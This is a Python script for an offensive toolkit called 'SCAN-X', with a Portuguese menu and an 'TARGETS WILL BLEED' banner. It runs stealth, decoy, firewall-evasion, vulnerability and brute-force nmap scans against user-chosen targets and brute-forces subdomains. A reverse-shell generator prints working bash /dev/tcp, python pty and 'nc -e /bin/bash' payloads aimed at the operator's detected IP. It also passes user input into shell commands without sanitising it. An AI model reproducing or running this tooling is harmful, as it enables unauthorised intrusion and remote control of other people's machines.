#!/usr/bin/env python3
import os, sys, subprocess, platform, socket, time, requests
from datetime import datetime

# --- CORES BLOOD MODE ---
R = '\033[31m'    # Vermelho Sangue
B = '\033[1;31m'  # Vermelho Negrito
W = '\033[37m'    # Branco Cinzento
G = '\033[90m'    # Cinza Escuro
N = '\033[0m'     # Reset

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    # SUA ASCII ART ORIGINAL
    print(f"""{B}
  ██████  ▄████▄   ▄▄▄       ███▄    █          ▒██    ██▒
 ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█    █          ▒▒ █ █ ▒░
 ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒          ░░ █   ░
   ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒            ░ █ █ ▒ 
 ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░          ▒██▒ ▒██▒
 ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒           ▒▒ ░ ░▓ ░
 ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░          ░░   ░▒ ░
 ░  ░  ░ ░           ░   ▒       ░   ░ ░            ░   ░  
        ░ ░ ░             ░  ░           ░            ░   ░  
                                                               
      {G}──────────────────────────────────────────────────{B}
      [ SYSTEM: SCAN-X | STATUS: REVOLUTIONARY v3.0 ]
      [ TARGETS WILL BLEED | BY: Anonymous40443 ]
      {G}──────────────────────────────────────────────────{N}""")

# --- FUNÇÕES DE ELITE ---

def search_exploit():
    print(f"\n{R}[{W}!{R}]{W} BUSCANDO EXPLOITS (CVE DATABASE)...{N}")
    service = input(f" {R}➤ SERVIÇO/VERSÃO (ex: Apache 2.4): {W}").strip()
    try:
        print(f"{G}[*] Consultando base de dados...{N}")
        response = requests.get(f"https://cve.circl.lu/api/search/{service.replace(' ', '/')}")
        results = response.json()
        print(f"\n{R}┌─[ VULNERABILIDADES ENCONTRADAS ]")
        for item in results[:5]:
            print(f"{R}│{W} ID: {item.get('id')}")
            print(f"{R}│{W} RESUMO: {item.get('summary')[:65]}...")
            print(f"{R}├───────────────────────────")
        print(f"{R}└───────────────────────────{N}")
    except: print(f"{R}[-]{W} Erro ao conectar na API de CVEs.{N}")
    input(f"\n{R}[ENTER]{N}")

def subdomain_finder():
    print(f"\n{R}[{W}!{R}]{W} SUBDOMAIN BRUTEFORCE...{N}")
    domain = input(f" {R}➤ DOMÍNIO (ex: alvo.com): {W}").strip()
    subs = ['www', 'mail', 'ftp', 'admin', 'dev', 'test', 'api', 'mysql', 'phpmyadmin', 'blog', 'server']
    print(f"{G}[*] Testando subdomínios em {domain}...{N}\n")
    for s in subs:
        url = f"{s}.{domain}"
        try:
            ip = socket.gethostbyname(url)
            print(f"{R}[+]{W} ACHADO: {url} {G}--> {ip}{N}")
        except: pass
    input(f"\n{R}[ENTER]{N}")

def rev_shell_gen():
    print(f"\n{R}[{W}!{R}]{W} GENERATOR: REVERSE SHELL PAYLOADS{N}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except: local_ip = "SEU_IP"
    
    port = input(f" {R}➤ PORTA PARA RECEBER (LPORT): {W}").strip()
    print(f"\n{B}[ SEU IP DETECTADO: {local_ip} ]{N}")
    print(f"\n{R}[ BASH ]{N}\nbash -i >& /dev/tcp/{local_ip}/{port} 0>&1")
    print(f"\n{R}[ PYTHON ]{N}\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{local_ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
    print(f"\n{R}[ NETCAT ]{N}\nnc -e /bin/bash {local_ip} {port}")
    input(f"\n{R}[ENTER]{N}")

def ip_tracker():
    print(f"\n{R}[{W}!{R}]{W} INICIANDO RASTREIO OSINT...{N}")
    target = input(f" {R}➤ IP ALVO: {W}").strip()
    try:
        data = requests.get(f"http://ip-api.com/json/{target}?fields=66846719").json()
        print(f"\n{R}┌─[ INFORMAÇÕES DO IP ]")
        print(f"{R}│{W} IP: {data.get('query')}")
        print(f"{R}│{W} LOCAL: {data.get('city')}, {data.get('regionName')} - {data.get('country')}")
        print(f"{R}│{W} PROVEDOR: {data.get('isp')}")
        print(f"{R}│{W} VPN/PROXY: {'Sim' if data.get('proxy') else 'Não'}")
        print(f"{R}└───────────────────────────{N}")
    except: print(f"{R}[-]{W} Erro na conexão API.{N}")
    input(f"\n{R}[ENTER]{N}")

def banner_grabbing():
    print(f"\n{R}[{W}!{R}]{W} BANNER GRABBING (SERVICE ENUM)...{N}")
    target = input(f" {R}➤ IP/HOST: {W}").strip()
    port = int(input(f" {R}➤ PORTA: {W}"))
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target, port))
        s.send(b'Hello\r\n')
        banner_data = s.recv(1024).decode().strip()
        print(f"\n{R}[+]{W} SERVIÇO DETECTADO NA PORTA {port}:\n{B}>> {W}{banner_data}{N}")
    except: print(f"{R}[-]{W} Falha ao capturar banner.{N}")
    input(f"\n{R}[ENTER]{N}")

def nmap_mega_menu():
    is_termux = os.path.exists('/data/data/com.termux/files/usr/bin/pkg')
    sudo = "sudo " if platform.system().lower() == "linux" and not is_termux else ""
    while True:
        banner()
        print(f" {R}RECON ARSENAL · 1/1{N} | {G}───{N}")
        print(f" {R}[{W}01{R}]{W} Ping Sweep        {R}[{W}11{R}]{W} Malware Check")
        print(f" {R}[{W}02{R}]{W} Stealth SYN       {R}[{W}12{R}]{W} Brute Force")
        print(f" {R}[{W}03{R}]{W} TCP Connect       {R}[{W}13{R}]{W} Firewall Evasion")
        print(f" {R}[{W}04{R}]{W} UDP Scan          {R}[{W}14{R}]{W} Decoy Scan")
        print(f" {R}[{W}05{R}]{W} Xmas Scan         {R}[{W}15{R}]{W} Fast Scan")
        print(f" {R}[{W}06{R}]{W} Null Scan         {R}[{W}16{R}]{W} IP TRACKER")
        print(f" {R}[{W}07{R}]{W} FIN Scan          {R}[{W}17{R}]{W} BANNER GRABBING")
        print(f" {R}[{W}08{R}]{W} OS Detection      {R}[{W}18{R}]{W} SUBDOMAIN FINDER")
        print(f" {R}[{W}09{R}]{W} AGGRESSIVE        {R}[{W}19{R}]{W} EXPLOIT SEARCH")
        print(f" {R}[{W}10{R}]{W} Vuln Scan (CVE)   {R}[{W}20{R}]{W} REV-SHELL GEN")
        print(f" {R}[{W}00{R}]{W} VOLTAR AO MENU{N}")
        
        print(f"\n {R}[scan@x]─[~/arsenal]{N}")
        op = input(f" {R}>>{N} ").strip()
        
        if op in ['0','00']: break
        if op == '16': ip_tracker(); continue
        if op == '17': banner_grabbing(); continue
        if op == '18': subdomain_finder(); continue
        if op == '19': search_exploit(); continue
        if op == '20': rev_shell_gen(); continue
        
        target = input(f" {R}➤ TARGET IP/DOMAIN: {W}").strip()
        if not target: continue
        
        cmds = {
            '1': f"{sudo}nmap -sn {target}", '2': f"{sudo}nmap -sS {target}",
            '3': f"{sudo}nmap -sT {target}", '4': f"{sudo}nmap -sU {target}",
            '5': f"{sudo}nmap -sX {target}", '6': f"{sudo}nmap -sN {target}",
            '7': f"{sudo}nmap -sF {target}", '8': f"{sudo}nmap -sV -O {target}",
            '9': f"{sudo}nmap -A {target}",  '10': f"{sudo}nmap --script vulners -sV {target}",
            '11': f"{sudo}nmap --script malware {target}", '12': f"{sudo}nmap --script auth {target}",
            '13': f"{sudo}nmap -f {target}", '14': f"{sudo}nmap -D RND:10 {target}",
            '15': f"{sudo}nmap -F {target}"
        }

        if op.lstrip('0') in cmds:
            print(f"\n{B}[!] INICIANDO ATAQUE...{N}\n")
            res = subprocess.getoutput(cmds[op.lstrip('0')])
            print(f"{W}{res}{N}")
            input(f"\n{R}[ENTER]{N}")

def main():
    while True:
        banner()
        print(f" {R}MAIN MODULES{N} | {G}───{N}")
        print(f" {R}[{W}1{R}]{W} NMAP MEGA MODULE (20+ TOOLS)")
        print(f" {R}[{W}2{R}]{W} LAZY RECON (Auto-Scan Network)")
        print(f" {R}[{W}3{R}]{W} MASSACRE (List .txt)")
        print(f" {R}[{W}0{R}]{W} EXIT SYSTEM")
        print(f"\n {R}[scan@x]─[~/home]{N}")
        choice = input(f" {R}>>{N} ").strip()
        
        if choice == '1': nmap_mega_menu()
        elif choice == '2':
            print(f"\n{G}[*] Detectando sua rede...{N}")
            try:
                # AUTO-DETECT CORRIGIDO
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                my_ip = s.getsockname()[0]
                s.close()
                range_ip = ".".join(my_ip.split('.')[:-1]) + ".0/24"
                print(f"{R}[!] REDE DETECTADA: {B}{range_ip}{N}")
                subprocess.run(f"nmap -sn {range_ip}", shell=True)
            except: print(f"{R}[-]{W} Erro na detecção. Use o módulo 1 manual.{N}")
            input(f"\n{R}[ENTER]{N}")
        elif choice == '3':
            file_path = input(f" {R}➤ PATH: {W}")
            if os.path.exists(file_path): subprocess.run(f"nmap -iL {file_path}", shell=True)
            input(f"\n{R}[ENTER]{N}")
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()
